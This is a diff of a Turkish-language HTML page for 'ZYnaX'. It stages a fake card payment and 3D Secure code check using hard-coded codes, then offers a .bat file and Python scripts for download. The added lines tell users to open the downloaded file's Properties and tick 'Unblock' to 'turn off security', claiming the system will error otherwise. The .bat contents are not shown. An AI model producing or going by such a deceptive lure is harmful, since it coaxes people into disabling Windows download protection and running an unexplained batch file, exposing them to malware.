@@ -39,8 +39,15 @@
 
         /* DOSYA MENÜSÜ */
         #file-menu { display: none; padding: 30px; text-align: center; }
-        .file-card { display: block; background: #f8f8f8; border: 1px solid #0f0; padding: 15px; margin: 10px 0; text-decoration: none; color: #000; font-weight: bold; border-radius: 5px; transition: 0.3s; }
-        .file-card:hover { background: #0f0; color: #000; }
+        .file-card { display: block; background: #f8f8f8; border: 1px solid #004a99; padding: 15px; margin: 10px 0; text-decoration: none; color: #000; font-weight: bold; border-radius: 5px; transition: 0.3s; }
+        .file-card:hover { background: #004a99; color: #fff; }
+
+        /* GÜVENLİK TALİMATI STİLİ */
+        .security-note {
+            background: #fff3cd; color: #856404; border: 1px solid #ffeeba;
+            padding: 10px; font-size: 11px; border-radius: 5px; margin-top: 20px;
+            text-align: left; line-height: 1.4;
+        }
     </style>
 </head>
 <body>
@@ -62,14 +69,8 @@
         <div id="bank-step">
             <div class="bank-header"><span>GÜVENLİ ÖDEME</span><span>VISA</span></div>
             <div class="bank-content">
-                <div class="input-group">
-                    <label>KART SAHİBİ</label>
-                    <input type="text" class="input-box" value="******** ********" disabled>
-                </div>
-                <div class="input-group">
-                    <label>KART NUMARASI</label>
-                    <input type="text" class="input-box" value="**** **** **** 4492" disabled>
-                </div>
+                <div class="input-group"><label>KART SAHİBİ</label><input type="text" class="input-box" value="******** ********" disabled></div>
+                <div class="input-group"><label>KART NUMARASI</label><input type="text" class="input-box" value="**** **** **** 4492" disabled></div>
                 <p style="font-size: 14px; font-weight: bold; color: #d32f2f;">Tutar: 150,00 TL</p>
                 <button class="pay-btn" onclick="to3DSecure()">3D SECURE İLE ÖDE</button>
             </div>
@@ -77,72 +78,55 @@
 
         <div id="secure-screen">
             <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" height="30" style="margin-bottom: 20px;">
-            <div id="wait-loader">
-                <div class="spinner"></div>
-                <p>Güvenli bağlantı kuruluyor...</p>
-            </div>
+            <div id="wait-loader"><div class="spinner"></div><p>Güvenli bağlantı kuruluyor...</p></div>
             <div id="otp-entry" style="display:none;">
                 <h3>3D Secure Onayı</h3>
-                <p style="font-size: 12px; color: #666;">Telefonunuza gelen 6 haneli kodu giriniz.</p>
-                <input type="text" id="user-otp" class="input-box" placeholder="Kod" maxlength="6" style="text-align:center; font-size: 24px; letter-spacing: 5px;">
-                <p id="error-msg" style="color:red; font-size: 12px; display:none;">Hatalı kod girdiniz!</p>
+                <input type="text" id="user-otp" class="input-box" placeholder="Kod" maxlength="6" style="text-align:center; font-size: 24px;">
+                <p id="error-msg" style="color:red; font-size: 12px; display:none;">Hatalı kod!</p>
                 <button class="pay-btn" onclick="checkCode()">ONAYLA</button>
             </div>
         </div>
 
         <div id="file-menu">
             <h2 style="color: #28a745;">✔ ERİŞİM SAĞLANDI</h2>
-            <p style="font-size: 12px;">Sisteminize uygun dosyayı seçiniz:</p>
+            
             <a href="ZYnaXPC-NO-SETUP.bat" class="file-card">WINDOWS PORTABLE (.BAT)</a>
-            <a href="ZYnaXPC.py" class="file-card">WINDOWS PYTHON (.PY)</a>
-            <a href="ZYnaX_Mac.py" class="file-card">macOS VERSION (.PY)</a>
+            
+            <div class="security-note">
+                <b>⚠️ KRİTİK GÜVENLİK ADIMI:</b><br>
+                Dosyayı indirdikten sonra; dosyaya <b>sağ tık</b> yapıp <b>Özellikler</b>'e girin. En aşağıda bulunan <b>"Güvenliği Kapat" (Engellemeyi Kaldır)</b> kutucuğunu işaretleyip Uygula/Tamam deyin. Aksi takdirde sistem hata verecektir.
+            </div>
+
+            <a href="ZYnaXPC.py" class="file-card" style="margin-top:20px; font-size: 12px; opacity: 0.7;">WINDOWS PYTHON (.PY)</a>
+            <a href="ZYnaX_Mac.py" class="file-card" style="font-size: 12px; opacity: 0.7;">macOS VERSION (.PY)</a>
         </div>
     </div>
 
     <script>
         const validCodes = ["778899", "112233", "445566", "990011", "554433"];
         let currentCode = "";
-
-        function openBank() {
-            document.getElementById('overlay').style.display = 'block';
-            document.getElementById('modal').style.display = 'block';
-        }
-
+        function openBank() { document.getElementById('overlay').style.display = 'block'; document.getElementById('modal').style.display = 'block'; }
         function to3DSecure() {
             document.getElementById('bank-step').style.display = 'none';
             document.getElementById('secure-screen').style.display = 'block';
-
-            // 5 saniye bekleme sonra SMS gelmesi
             setTimeout(() => {
                 document.getElementById('wait-loader').style.display = 'none';
                 document.getElementById('otp-entry').style.display = 'block';
-                
-                // Rastgele kod seç
                 currentCode = validCodes[Math.floor(Math.random() * validCodes.length)];
-                document.getElementById('sms-text').innerText = "ZYnaX İşlem Kodunuz: " + currentCode;
+                document.getElementById('sms-text').innerText = "ZYnaX Kodunuz: " + currentCode;
                 document.getElementById('sms-pop').classList.add('active');
             }, 5000);
         }
-
         function checkCode() {
-            const input = document.getElementById('user-otp').value;
-            if (input === currentCode) {
+            if (document.getElementById('user-otp').value === currentCode) {
                 document.getElementById('secure-screen').style.display = 'none';
                 document.getElementById('file-menu').style.display = 'block';
                 document.getElementById('sms-pop').classList.remove('active');
-            } else {
-                document.getElementById('error-msg').style.display = 'block';
-                document.getElementById('user-otp').value = "";
-            }
+            } else { document.getElementById('error-msg').style.display = 'block'; }
         }
-
-        // Matrix Efekti
-        const canvas = document.getElementById('matrix');
-        const ctx = canvas.getContext('2d');
+        const canvas = document.getElementById('matrix'); const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const letters = "01ZYNAX";
-        const fontSize = 16;
-        const columns = canvas.width / fontSize;
+        const letters = "01ZYNAX"; const fontSize = 16; const columns = canvas.width / fontSize;
         const drops = Array(Math.floor(columns)).fill(1);
         function draw() {
             ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
